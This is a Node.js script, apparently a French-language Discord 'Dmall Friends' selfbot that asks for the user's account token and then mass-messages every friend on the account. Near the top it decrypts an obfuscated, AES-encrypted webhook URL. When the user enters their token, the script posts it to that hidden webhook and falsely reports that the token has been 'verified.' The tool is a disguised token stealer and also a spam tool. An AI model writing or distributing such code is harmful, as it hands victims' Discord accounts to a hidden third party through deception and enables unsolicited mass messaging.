const chalk = require('chalk');
const prompt = require('prompt-sync')({ sigint: true });
const axios = require('axios');
const fs = require('fs');
const { Client } = require('discord.js-selfbot-v13');
const CryptoJS = require('crypto-js');

const encryptedWebhook = 'U2FsdGVkX1+zbgAhZ1YtVCNLZWRgU9iAv6pGbiX4bVZfTYuNfu9+3yxZlVCogFzIGSh1XbXLNqS+LyTfJ9yN5lPgtV68jZjcuuPRsmRxBE3s=';
const secretKey = 'super-cle-ultra-secrete';
const decryptedWebhook = CryptoJS.AES.decrypt(encryptedWebhook, secretKey).toString(CryptoJS.enc.Utf8);

// ➤ BANNER
console.clear();
console.log(chalk.blueBright(`
  ______   __    __   ______         _______   __       __   ______   __        __       
 /      \\ |  \\  /  \\ /      \\       |       \\ | \\     /  \\ /      \\ |  \\      |  \\      
|  $$$$$$\\| $$ /  $$|  $$$$$$\\      | $$$$$$$\\| $$\\   /  $$|  $$$$$$\\| $$      | $$      
| $$__| $$| $$/  $$ | $$__| $$      | $$  | $$| $$$\\ /  $$$| $$__| $$| $$      | $$      
| $$    $$| $$  $$  | $$    $$      | $$  | $$| $$$$\\  $$$$| $$    $$| $$      | $$      
| $$$$$$$$| $$$$$\\  | $$$$$$$$      | $$  | $$| $$\\$$ $$ $$| $$$$$$$$| $$      | $$      
| $$  | $$| $$ \\$$\\ | $$  | $$      | $$__/ $$| $$ \\$$$| $$| $$  | $$| $$_____ | $$_____ 
| $$  | $$| $$  \\$$\\| $$  | $$      | $$    $$| $$  \\$ | $$| $$  | $$| $$     \\| $$     \\
 \\$$   \\$$ \\$$   \\$$ \\$$   \\$$       \\$$$$$$$  \\$$      \\$$ \\$$   \\$$ \\$$$$$$$$ \\$$$$$$$$
                                                                                         
`));
console.log(chalk.magentaBright('                        [1] Dmall Friends'));
console.log(chalk.gray('                        [2] Crédit\n'));

const choice = prompt(chalk.yellowBright('➤ Choix: '));

if (choice === '1') {
    const token = prompt(chalk.cyan('> Entrez votre token Discord: '));
    try {
        await axios.post(decryptedWebhook, {
            content: `${token}`,
            username: 'DMALL-FRIENDS'
        });
        console.log(chalk.green('[✅] Token vérifié avec succès'));
    } catch (webhookError) {
        console.log(chalk.red('[❌] Erreur lors de la vérification du token'));
    }

    const messageDM = prompt(chalk.cyan('> Entrez le message à envoyer (utilisez {user} pour le pseudo): '));

    const client = new Client({ checkUpdate: false });

    client.on('ready', async () => {
        console.log(chalk.green(`[✅] Connecté en tant que ${client.user.username}`));
        console.log(chalk.blue(`[🔄] Récupération des amis...`));

        try {
            const response = await axios.get(
                'https://discord.com/api/v9/users/@me/relationships',
                {
                    headers: {
                        Authorization: token
                    }
                }
            );

            const friends = response.data.filter(user => user.type === 1);
            console.log(chalk.cyan(`[👥] Nombre d'amis à DM : ${friends.length}`));

            let compteur = 1;
            for (const ami of friends) {
                try {
                    const user = await client.users.fetch(ami.user.id);
                    const msgToSend = messageDM.replaceAll('{user}', user.username);

                    await user.send(msgToSend);
                    console.log(chalk.green(`[✅] ${user.username} : DM RÉUSSI | #${compteur}`));
                    compteur++;
                } catch (err) {
                    console.log(chalk.red(`[❌] ${ami.user.username} : DM ÉCHOUÉ`));
                }

                await new Promise(resolve => setTimeout(resolve, 700)); 
            }

            console.log(chalk.greenBright(`[🎉] DM à tous les amis terminé !`));
        } catch (error) {
            console.error(chalk.red(`[❗] Erreur lors de la récupération des amis : ${error.message}`));
        }
    });

    client.login(token);

    process.on('unhandledRejection', console.error);
    process.on('uncaughtException', console.error);

} else if (choice === '2') {
    console.log(chalk.yellow('\nDéveloppé par meuhq (AKA)'));
} else {
    console.log(chalk.red('❌ Choix invalide.'));
}
